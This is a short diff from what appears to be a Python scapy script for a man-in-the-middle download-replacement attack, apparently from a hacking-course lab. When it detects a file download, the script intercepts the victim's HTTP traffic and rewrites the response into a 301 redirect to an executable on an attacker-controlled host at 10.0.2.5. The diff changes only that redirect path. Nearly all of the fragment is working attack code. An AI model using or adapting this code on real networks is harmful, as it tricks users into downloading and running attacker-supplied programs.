@@ -58,7 +58,7 @@ def modify_packet(packet, scapy_packet, file_type):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print('[+] Replacing file')
                 modified_packet = set_load(
-                    scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.5/unchi/CGoban.exe\n\n')
+                    scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.5/CGoban.exe\n\n')
 
                 # convert packet to a string
                 packet.set_payload(str(modified_packet))
